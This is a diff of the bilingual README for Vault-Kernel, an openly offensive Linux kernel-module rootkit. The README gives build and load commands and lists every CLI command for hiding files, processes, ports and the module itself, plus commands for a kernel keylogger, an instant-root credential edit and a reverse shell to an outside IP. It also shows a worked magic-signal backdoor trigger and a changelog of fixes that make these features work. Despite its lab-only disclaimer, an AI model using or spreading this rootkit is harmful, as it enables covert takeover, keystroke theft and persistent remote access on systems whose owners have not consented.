@@ -1,30 +1,25 @@
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=0,2,3,6,8&height=120&section=header&text=Vault-Kernel&fontSize=50&fontColor=ff4444&animation=twinkling" alt="header"/>
-</p>
+<div align="center">
+  <img src="docs/images/banner.png" alt="Vault-Kernel" width="820"/>
+</div>
 
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&duration=3500&pause=800&color=FF3333&center=true&vCenter=true&repeat=false&width=600&lines=Linux+LKM+Rootkit+Engine;syscall+hooking+%7C+hide+%7C+keylogger+%7C+persistence;red+team+%E2%9C%93+offensive+%F0%9F%9A%80+covert+%F0%9F%95%B7%EF%B8%8F" alt="typing-svg"/>
-</p>
+<div align="center">
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Language-C-CC0000?style=for-the-badge&logo=c&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Platform-Linux-FF6600?style=for-the-badge&logo=linux&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Type-LKM-AA0000?style=for-the-badge&logo=linux&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Client-Go-00ADD8?style=for-the-badge&logo=go&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Kernel-5.4_–_6.12-FF4500?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/License-MIT-1155CC?style=for-the-badge"/>
-</p>
+[![CI](https://github.com/Ruby570bocadito/Vault-Kernel/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/Ruby570bocadito/Vault-Kernel/actions/workflows/ci.yml)
+![Language](https://img.shields.io/badge/Language-C-CC0000?style=flat&logo=c&logoColor=white)
+![Client](https://img.shields.io/badge/Client-Go-00ADD8?style=flat&logo=go&logoColor=white)
+![Platform](https://img.shields.io/badge/Platform-Linux%20x86__64-FF6600?style=flat&logo=linux&logoColor=white)
+![Kernel](https://img.shields.io/badge/Kernel-4.17%20%E2%80%93%206.x%20(pt__regs)-FF4500?style=flat)
+![License](https://img.shields.io/badge/License-MIT-1155CC?style=flat)
 
-<p align="center">
-  <img src="https://img.shields.io/github/v/tag/Ruby570bocadito/Vault-Kernel?style=flat&label=version&color=CC0000"/>
-  <img src="https://img.shields.io/github/last-commit/Ruby570bocadito/Vault-Kernel?style=flat&color=FF4444"/>
-  <img src="https://img.shields.io/github/stars/Ruby570bocadito/Vault-Kernel?style=flat&color=gold"/>
-  <img src="https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat"/>
-</p>
+[**Español**](#-espa%C3%B1ol) · [**English**](#-english)
 
-<br/>
+</div>
 
-> **⚠️ WARNING — Ético / Legal**
+---
+
+## 🇪🇸 Español
+
+> **⚠️ AVISO ÉTICO / LEGAL**
 >
 > Vault-Kernel es **exclusivamente** para auditorías de seguridad autorizadas, entornos controlados de laboratorio, investigación académica y operaciones de red team con **permiso explícito por escrito**.
 >
@@ -32,11 +27,7 @@
 >
 > **No hay razón legítima para cargar esto en un sistema que no te pertenece o para el que no tienes autorización.**
 
-<br/>
-
----
-
-## 📐 Arquitectura
+### 📐 Arquitectura
 
 ```mermaid
 flowchart LR
@@ -46,24 +37,24 @@ flowchart LR
     end
 
     subgraph Kernel["🧠 Kernel Space"]
-        LKM["LKM .ko<br/>(C)"]
+        LKM["LKM .ko<br/>(C, pt_regs ABI)"]
         SCT["syscall table<br/>hooking"]
         WP["WP bypass<br/>(CR0)"]
         RCU["RCU sync"]
     end
 
-    subgraph Ops["⚙️ Operations"]
+    subgraph Ops["⚙️ Modules"]
         FH["file_hide<br/>getdents64"]
-        PH["proc_hide<br/>PID filter"]
-        NH["net_hide<br/>/proc/net/*"]
+        PH["proc_hide<br/>PID filter + kill guard"]
+        NH["net_hide<br/>/proc/net/* read filter"]
         KL["keylogger<br/>notifier chain"]
-        BS["backdoor<br/>reverse shell"]
-        PE["priv_esc<br/>cred edit"]
-        SH["self_hide<br/>lsmod del"]
+        BS["backdoor<br/>kill(35) magic packet"]
+        PE["priv_esc<br/>cred rootify"]
+        SH["stealth<br/>lsmod + sysfs del"]
     end
 
     subgraph Device["💾 /dev/vault_kernel"]
-        IOC["ioctl interface"]
+        IOC["ioctl interface<br/>16 commands incl. GET_STATS"]
     end
 
     CLI -->|ioctl| Device
@@ -80,196 +71,190 @@ flowchart LR
     SCT --> SH
 ```
 
-<br/>
-
----
-
-## 🔥 Features
+### 🔥 Features
 
 | Feature | Technique | Stealth |
 |---------|-----------|---------|
-| **Hide Files/Dirs** | Hook `getdents64`, `openat`, `unlinkat` | 🟢 Invisible to `ls`, `find`, `stat` |
-| **Hide Processes** | PID filter in `/proc` read | 🟢 Invisible to `ps`, `top`, `htop` |
-| **Hide Ports** | Filter `/proc/net/tcp*`, `/proc/net/udp*` | 🟢 Invisible to `netstat`, `ss` |
-| **Kernel Keylogger** | Keyboard notifier chain | 🟢 Captures before X11/Wayland |
-| **Reverse Shell** | `call_usermodehelper()` via workqueue | 🟢 No disk touch, no visible fork |
-| **Magic Backdoor** | Trigger via `kill()` syscall | 🟡 No open port required |
-| **Instant Root** | Direct `cred` manipulation | 🟢 Root any PID instantly |
-| **Hide from lsmod** | `list_del` + `kobject_del` | 🟢 Invisible to `lsmod` |
-| **Self-Hiding Module** | Removes from kernel module list | 🟢 Cannot be found after load |
+| **Hide Files/Dirs** | Hook `getdents64`/`getdents`/`openat`/`unlinkat` | 🟢 Invisible a `ls`, `find`, `stat` |
+| **Hide Processes** | Filtro de PID en `/proc` + protección de señales | 🟢 Invisible a `ps`, `top`, `htop` |
+| **Hide Ports** | Filtrado del `read()` de `/proc/net/tcp*` y `udp*` | 🟢 Invisible a `netstat`, `ss` |
+| **Kernel Keylogger** | Cadena de notificadores de teclado | 🟢 Captura antes que X11/Wayland |
+| **Reverse Shell** | `call_usermodehelper()` vía workqueue | 🟢 Sin ficheros en disco |
+| **Magic Backdoor** | `kill(pid, 35)` con palabra + puerto codificados (hash FNV-1a) | 🟡 Sin puerto abierto |
+| **Instant Root** | Mutación de `cred` propia (commit_creds) o remota (in-place) | 🟢 Root a cualquier PID |
+| **Hide from lsmod** | `list_del` + `kobject_del` con recuperación segura | 🟢 Invisible a `lsmod`/sysfs |
+| **Live Stats** | ioctl `GET_STATS`: versión, hooks, contadores, uptime | 🔵 Observabilidad del implante |
 
-<br/>
+### 🎬 Demo
 
----
+<div align="center">
+  <img src="docs/images/demo.gif" alt="Vault-Kernel CLI demo" width="820"/>
+  <p><sub>Sesión simulada — el módulo nunca se carga fuera de un laboratorio autorizado.</sub></p>
+</div>
 
-## ⚡ Quick Start
-
-### Prerequisites
+### ⚡ Quick Start
 
 ```bash
+# Dependencias (Debian/Ubuntu)
 sudo apt install build-essential linux-headers-$(uname -r) golang-go
-```
 
-### Build & Load
-
-```bash
-# 1. Build kernel module
+# 1. Compilar el módulo
 cd src && make
 
-# 2. Load into kernel
+# 2. Cargar en el kernel (¡SOLO en tu laboratorio!)
 sudo insmod vault_kernel.ko
 
-# 3. Build Go client
-cd ../client/go && go build -o vault_kernel ./cmd/vault_kernel/
+# 3. Compilar el cliente Go
+cd ../client/go && go build -ldflags="-s -w" -o vault_kernel ./cmd/vault_kernel/
 
-# 4. Verify it's loaded
+# 4. Verificar
 sudo ./vault_kernel status
+sudo ./vault_kernel stats
 ```
 
-### Usage
+### 📚 Todos los comandos CLI
 
 ```bash
-# Escalate to root instantly
-sudo ./vault_kernel give-root
-
-# Hide a file from ls/find/stat
-sudo ./vault_kernel hide-file malicious.sh
-
-# Hide a process from ps/top
-sudo ./vault_kernel hide-pid 1337
-
-# Hide a network port from netstat/ss
-sudo ./vault_kernel hide-port 4444
-
-# Hide the rootkit from lsmod
-sudo ./vault_kernel hide-module
-
-# Spawn reverse shell
-sudo ./vault_kernel shell 10.0.0.5:1337
-
-# Read captured keystrokes
-sudo ./vault_kernel keylog
-
-# List all hidden objects
-sudo ./vault_kernel list
+vault_kernel status              # ¿Está cargado el módulo?
+vault_kernel stats               # Estadísticas en vivo (hooks, contadores, uptime)
+vault_kernel give-root [pid]     # Root instantáneo (por defecto: self)
+vault_kernel hide-file <name>    # Ocultar fichero/directorio
+vault_kernel unhide-file <name>  # Revelar fichero/directorio
+vault_kernel hide-pid <pid>      # Ocultar proceso (kill() → ESRCH)
+vault_kernel unhide-pid <pid>    # Revelar proceso
+vault_kernel hide-port <port>    # Ocultar puerto TCP/UDP
+vault_kernel unhide-port <port>  # Revelar puerto
+vault_kernel list                # Listar todo lo oculto
+vault_kernel shell <ip:port>     # Reverse shell vía usermodehelper
+vault_kernel magic <word>        # Activar backdoor de palabra mágica
+vault_kernel magic-encode <word> <port>  # Imprimir el kill() listo para disparar
+vault_kernel keylog              # Leer pulsaciones capturadas
+vault_kernel keylog-clear        # Limpiar buffer del keylogger
+vault_kernel hide-module         # Ocultar de lsmod
+vault_kernel unhide-module       # Revelar en lsmod
+vault_kernel version             # Versión del cliente y ABI
 ```
 
-<br/>
+### 🪄 Backdoor de palabra mágica (v3.1)
 
----
+El backdoor combina **palabra + puerto** en un solo `kill()`. El módulo compara el hash **FNV-1a-16** de la palabra; el puerto viaja en los 16 bits altos del PID:
 
-## 📦 Project Structure
+```bash
+# 1. Configurar la palabra en el módulo
+sudo ./vault_kernel magic pwn
+
+# 2. Obtener el disparador listo para usar
+sudo ./vault_kernel magic-encode pwn 4444
+# [*] Magic word : pwn (hash 0xBCBF)
+# [*] Port       : 4444
+# [*] Encoded PID: 291290303
+# [*] Trigger    : kill -s 35 291290303
+
+# 3. Desde la víctima, disparar la reverse shell a 127.0.0.1:4444
+kill -s 35 291290303
+```
+
+> ℹ️ La señal es **35** = `SIGRTMIN+1` según glibc en x86_64 (el `SIGRTMIN` del kernel es 32 y **no** coincide con el de usuario — bug corregido en v3.1: antes la señal 33 nunca llegaba).
+
+### 🧪 Testing
+
+```bash
+# Tests unitarios Go (ioctl layout, FNV, serialización)
+cd client/go && go test ./... -v -count=1
+
+# Tests de integración (requiere VM con el módulo cargado)
+sudo bash tests/integration.sh
+
+# Compilación del .ko en Docker
+bash docker/build.sh
+```
+
+**CI** valida en cada push: `gofmt`/`go vet`/`go build`/`go test`, **compilación real del `.ko`** con headers del runner, `shellcheck` de todos los scripts y `py_compile`+`ruff` del código Python. Sin atajos: si está verde, compila.
+
+### 🧠 Compatibilidad de kernel
+
+| Kernel | Estado | Notas |
+|--------|--------|-------|
+| **x86_64 ≥ 4.17** (4.17 – 6.x) | ✅ Soportado | ABI `pt_regs` obligatoria; `class_create()` adaptado (≥6.4) |
+| x86_64 < 4.17 | ❌ Rechazado | El módulo **no compila** — las llamadas antiguas pasaban args directos |
+| WSL2 | ❌ No soportado | Sin headers de kernel |
+| ARM64 | 🚧 Planificado | En el roadmap |
+
+### 📦 Estructura
 
 ```
 Vault-Kernel/
-├── src/                         # Kernel module (C)
-│   ├── main.c                   # init/exit, syscall table find, WP bypass
-│   ├── hooking.c                # install/remove hooks + RCU sync
-│   ├── file_hide.c              # getdents64/getdents/openat/unlinkat hooks
-│   ├── proc_hide.c              # PID hiding + kill hook (magic backdoor)
-│   ├── net_hide.c               # /proc/net/* filtering via read hook
+├── src/                         # Módulo kernel (C)
+│   ├── main.c                   # init/exit, búsqueda de syscall table, bypass WP
+│   ├── hooking.c                # instalación/remoción de hooks + RCU sync
+│   ├── file_hide.c              # hooks getdents64/getdents/openat/unlinkat
+│   ├── proc_hide.c              # ocultación PID + guardia kill()
+│   ├── net_hide.c               # filtrado read() de /proc/net/*
 │   ├── keylogger.c              # keyboard notifier chain
-│   ├── backdoor.c               # reverse shell + magic packet trigger
-│   ├── priv_esc.c               # give-root via cred manipulation
-│   ├── stealth.c                # hide from lsmod + kobject_del
-│   ├── ioctl.c                  # /dev/vault_kernel char device
-│   ├── core.h                   # headers + ioctl constants
+│   ├── backdoor.c               # reverse shell + magic packet (hash FNV-1a)
+│   ├── priv_esc.c               # give-root (self + PID remoto)
+│   ├── stealth.c                # ocultación lsmod/sysfs reversible
+│   ├── ioctl.c                  # /dev/vault_kernel (16 ioctls)
+│   ├── core.h                   # headers + capa compat pt_regs + constantes
 │   └── Makefile
 ├── client/
-│   ├── vault_kernel_cli.py      # Python CLI (legacy, 14 commands)
-│   └── go/                      # Go CLI (primary, single binary)
-│       ├── go.mod               # Module: github.com/ruby570bocadito/vault-kernel
-│       ├── cmd/vault_kernel/    # Entry point (15 commands)
-│       └── internal/vaultkernel/# ioctl wrapper + unit tests
-├── payloads/                    # Payload generator (Python)
-│   ├── payload.py               # Interactive generator (3 formats)
-│   └── builder.sh               # CLI wrapper
-├── docker/                      # Docker build + test environment
-│   ├── Dockerfile.build
-│   ├── docker-compose.yml
-│   ├── docker-compose.test.yml
-│   ├── build.sh
-│   └── test.sh
-├── tests/                       # Integration tests
-│   └── integration.sh
-└── brain/                       # Architecture decision records
-    ├── ADR.md
-    └── session_*.md
+│   ├── vault_kernel_cli.py      # CLI Python (legacy, paridad con Go)
+│   └── go/                      # CLI Go (principal, binario único)
+│       ├── cmd/vault_kernel/    # 18 comandos
+│       └── internal/vaultkernel/# wrapper ioctl + tests
+├── payloads/                    # Generador de payloads (Python)
+├── docker/                      # Build + entorno de prueba multi-nodo
+├── tests/integration.sh         # Suite de integración (VM)
+├── docs/images/                 # Banner + demo GIF
+├── brain/ADR.md                 # Decisiones de arquitectura
+└── .github/workflows/ci.yml     # CI (4 jobs, sin puertas falsas)
 ```
 
-<br/>
+### 🔄 Changelog v3.1
+
+**Arreglos críticos** — todos verificados en esta versión:
+
+| # | Bug | Fix |
+|---|-----|-----|
+| 1 | Hooks con ABI pre-4.17 (args directos) → rotos en **todos** los kernels anunciados | Capa compat `pt_regs` (`regs->di/si/dx`); `< 4.17` no compila (protección explícita) |
+| 2 | `give-root <pid>` daba root al **caller**, no al objetivo + UAF de `task->comm` | Ruta self (`commit_creds`) y ruta remota (mutación in-place bajo `task_lock`); `comm` se lee con referencia viva |
+| 3 | `net_hide` **muerto**: parseaba la IP y comparaba byte-order incorrecto | Parser por campos (local+remote), puertos en host order, línea parcial sin `\n` intacta |
+| 4 | `getdents64`: fuga de **todas** las entradas si el buffer entero estaba oculto | `kept == 0 → return 0` (EOF); absorbido único en el entry anterior |
+| 5 | Señal mágica `SIGRTMIN+1`=33 del kernel ≠ 35 de glibc → el backdoor **nunca** disparaba | `MAGIC_SIGNAL 35` explícito, sincronizado con CLI (constante `MagicSignal`) |
+| 6 | Palabra mágica se guardaba pero **nunca se usaba** | Trigger = `(port<<16) \| fnv1a16(word)`, idéntico en C/Go/Python |
+| 7 | `kbuf[4096]` en stack del kernel + `copy_to_user` bajo spinlock | Buffers en heap; snapshot fuera del lock |
+| 8 | `device_create` sin chequear `ERR_PTR` | `IS_ERR()` + propagación de error |
+| 9 | Hook `write` passthrough puro en **todo** el sistema (overhead) | Eliminado — 6 hooks con propósito |
+| 10 | `((PASS++))` con `set -e` mataba integration.sh + colores `\033` literales | Reescrito: `PASS=$((PASS+1))`, ANSI-C quoting `$'\e[...]'`, shellcheck limpio |
+| 11 | Sin CI (el ADR lo prometía) | `.github/workflows/ci.yml` — 4 jobs honestos, compila el `.ko` real |
+| 12 | Clase `RooteameClient` herencia del rename + unidad systemd inválida (`$(shuf)` literal, `Type=forking`) | Renombrado; `Type=oneshot` + `RemainAfterExit=yes` |
 
 ---
 
-## 🧪 Testing
+## 🇬🇧 English
 
-```bash
-# Unit tests (Go, 15 tests)
-cd client/go && go test ./... -v
+> **⚠️ ETHICAL / LEGAL WARNING**
+>
+> Vault-Kernel is **exclusively** for authorized security audits, controlled lab environments, academic research and red team operations with **explicit written permission**.
+>
+> Unauthorized use of this software may violate local and international laws. The owner and contributors are **not responsible** for misuse. You are solely responsible for complying with all applicable laws.
 
-# Integration tests (requires VM with module loaded)
-sudo bash tests/integration.sh
+Vault-Kernel is a Linux **LKM rootkit engine** for red team training and authorized lab work: syscall table hooking with the modern **pt_regs ABI**, file/process/port hiding, a kernel keylogger, a magic-packet backdoor and in-place credential escalation — controlled through a zero-dependency Go CLI over `/dev/vault_kernel`.
 
-# Docker build + test network
-bash docker/build.sh              # Compile .ko in container
-bash docker/test.sh up            # Start 3-node test network
-docker exec -it vault_kernel-attacker bash
-bash docker/test.sh down          # Cleanup
-```
+**Quick start:** `cd src && make` → `sudo insmod vault_kernel.ko` (lab only) → `cd client/go && go build -ldflags="-s -w" -o vault_kernel ./cmd/vault_kernel/` → `sudo ./vault_kernel stats`.
 
-<br/>
+**Highlights**
 
----
+- **Modern syscall ABI** — hooks use `struct pt_regs` argument extraction; the module refuses to build against pre-4.17 kernels instead of silently corrupting every syscall.
+- **Working magic backdoor** — `kill(pid, 35)` with `(port << 16) | fnv1a16(word)`; identical FNV-1a implementation in C, Go and Python, verified by unit tests.
+- **Real privilege escalation** — self-rooting via `commit_creds()`, arbitrary-PID rooting via in-place `cred` mutation under `task_lock()` (no use-after-free, no leaked credentials).
+- **Live observability** — `vault_kernel stats` reports version, installed hooks, hidden-object counters, keylog buffer and uptime through a dedicated ioctl.
+- **Honest CI** — four jobs (Go toolchain, real `.ko` compilation with runner kernel headers, shellcheck, Python lint); no masked failures.
 
-## 🧠 Kernel Compatibility
+**Compatibility:** x86_64 kernels ≥ 4.17 (pt_regs syscall ABI), up to 6.x (`class_create()` API adapted). WSL2 and ARM64 are not supported. See the Spanish section above for the full feature table, command reference and v3.1 changelog.
 
-| Kernel Version | Status | Notes |
-|----------------|--------|-------|
-| **5.4 – 5.6** | ✅ Supported | `kallsyms_lookup_name` exported |
-| **5.7 – 5.x** | ✅ Supported | kprobe fallback |
-| **6.0 – 6.6+** | ✅ Supported | `class_create()` adapted |
-| **WSL2** | ❌ Not supported | No kernel headers |
-| **ARM64** | 🚧 Planned | On roadmap |
+**License:** MIT — see [LICENSE](LICENSE). Built for learning; use it only where you have written permission.
 
-<br/>
-
----
-
-
-## 📚 All CLI Commands
-
-```bash
-vault_kernel status              # Check if module is loaded
-vault_kernel give-root [pid]     # Grant root to a process
-vault_kernel hide-file <name>    # Hide file/directory
-vault_kernel unhide-file <name>  # Unhide file/directory
-vault_kernel hide-pid <pid>      # Hide process
-vault_kernel unhide-pid <pid>    # Unhide process
-vault_kernel hide-port <port>    # Hide network port
-vault_kernel unhide-port <port>  # Unhide network port
-vault_kernel list                # List all hidden objects
-vault_kernel shell <ip:port>     # Initiate reverse shell
-vault_kernel magic <word>        # Activate backdoor without open port
-vault_kernel keylog              # Read captured keystrokes
-vault_kernel keylog-clear        # Clear keylogger buffer
-vault_kernel hide-module         # Hide rootkit from lsmod
-vault_kernel unhide-module       # Make module visible again
-```
-
-<br/>
-
----
-
-## 🤝 Contributing
-
-PRs are welcome. For major changes, open an issue first. Keep everything in the spirit of **authorized security testing education**.
-
-<br/>
-
----
-
-<p align="center">
-  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a></sub>
-  <br/>
-  <sub>Vault-Kernel — Linux LKM Rootkit Engine v3.0</sub>
-</p>
+<div align="center">
+  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a> — Vault-Kernel v3.1</sub>
+</div>
